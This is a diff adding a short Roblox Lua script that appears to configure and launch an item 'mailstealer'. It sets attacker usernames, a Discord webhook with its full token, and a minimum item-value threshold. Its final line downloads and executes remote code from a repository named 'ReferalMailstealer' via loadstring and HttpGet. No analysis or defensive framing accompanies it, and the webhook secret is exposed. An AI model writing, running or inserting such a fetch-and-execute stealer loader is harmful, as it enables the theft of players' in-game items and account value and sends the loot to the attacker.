@@ -1,0 +1,6 @@
+Username = "Daniil2008121"
+Username2 = "robloks23_1"
+Webhook = "https://discord.com/api/webhooks/1244716486438948995/TrVIKMKLwiFTwSpTV9yPCkatETXVvimcRY_us7xLhBUlShFnwa1Q0XMRmdWAYk5JbC5P"
+min_rap = 500000
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ReferalMailstealer/V2.0/main/lua"))()
